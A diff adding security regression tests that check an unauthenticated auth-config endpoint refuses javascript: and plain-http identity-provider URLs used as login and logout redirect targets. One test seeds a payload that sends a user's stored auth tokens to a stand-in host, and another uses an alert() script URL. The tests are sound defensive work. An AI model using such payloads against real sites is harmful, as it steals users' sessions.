@@ -23,6 +23,7 @@ a resource the caller is not entitled to — on a route that had not been swept:
 """
 import ipaddress
 import unittest
+from unittest.mock import patch
 
 from fastapi.testclient import TestClient
 from sqlalchemy import create_engine
@@ -211,3 +212,73 @@ class TestExecutionRoleCannotBeHijacked(_ApiTestCase):
 
 if __name__ == "__main__":
     unittest.main()
+
+
+class TestLoginConfigRefusesUnsafeNavigationTargets(_ApiTestCase):
+    """`/api/auth/config` must not hand the login page a URL it will navigate to.
+
+    The reported sink was Link Account's `authorize_url`, which needs
+    `agent:read`. Fixing it surfaced three more sinks fed by the same
+    IdP-derived values, and the worst of them is here: `/api/auth/config` is
+    **unauthenticated** and serves `authorization_endpoint` (assigned to
+    `window.location.href` to start the login redirect) and `issuer_url`
+    (used to build the IdP logout URL). So this sink needs no scope at all.
+
+    `fetch_discovery` rejects a non-https endpoint now, so no newly registered
+    provider can carry one. These cover the rows written before that check.
+    """
+
+    def _active_idp(self, **overrides):
+        from app.models.identity_provider import IdentityProvider
+
+        fields = dict(
+            name="corp-idp", provider_type="okta",
+            issuer_url="https://corp.okta.com",
+            authorization_endpoint="https://corp.okta.com/oauth2/v1/authorize",
+            token_endpoint="https://corp.okta.com/oauth2/v1/token",
+            client_id="cid", client_type="public", status="active",
+        )
+        fields.update(overrides)
+        idp = IdentityProvider(**fields)
+        self.db.add(idp)
+        self.db.commit()
+        # /api/auth/config opens its own SessionLocal rather than taking the
+        # get_db dependency, so the override alone leaves it reading a
+        # different database — which is how the three negative tests below
+        # first passed without the seeded provider ever being found.
+        self._session_patch = patch("app.db.SessionLocal", return_value=self.db)
+        self._session_patch.start()
+        self.addCleanup(self._session_patch.stop)
+        return idp
+
+    def test_javascript_authorization_endpoint_is_not_served(self) -> None:
+        self._active_idp(
+            authorization_endpoint="javascript:fetch('//x/?'+sessionStorage.loom_auth_tokens)",
+        )
+        resp = self.client.get("/api/auth/config")
+        self.assertEqual(200, resp.status_code)
+        self.assertNotIn("javascript:", resp.text)
+        # Falls through to the Cognito default rather than 500ing the endpoint
+        # the whole UI boots from.
+        self.assertNotEqual("okta", resp.json().get("provider_type"))
+
+    def test_javascript_issuer_url_is_not_served(self) -> None:
+        """issuer_url becomes the logout navigation target."""
+        self._active_idp(issuer_url="javascript:alert(1)")
+        resp = self.client.get("/api/auth/config")
+        self.assertNotIn("javascript:", resp.text)
+        self.assertNotEqual("okta", resp.json().get("provider_type"))
+
+    def test_plain_http_endpoint_is_not_served(self) -> None:
+        self._active_idp(authorization_endpoint="http://corp.okta.com/oauth2/v1/authorize")
+        resp = self.client.get("/api/auth/config")
+        self.assertNotIn("http://corp.okta.com", resp.text)
+
+    def test_a_valid_https_provider_is_served_normally(self) -> None:
+        """Positive control: the guard must not break external login."""
+        self._active_idp()
+        resp = self.client.get("/api/auth/config")
+        self.assertEqual(200, resp.status_code)
+        body = resp.json()
+        self.assertEqual("okta", body["provider_type"])
+        self.assertEqual("https://corp.okta.com/oauth2/v1/authorize", body["authorization_endpoint"])
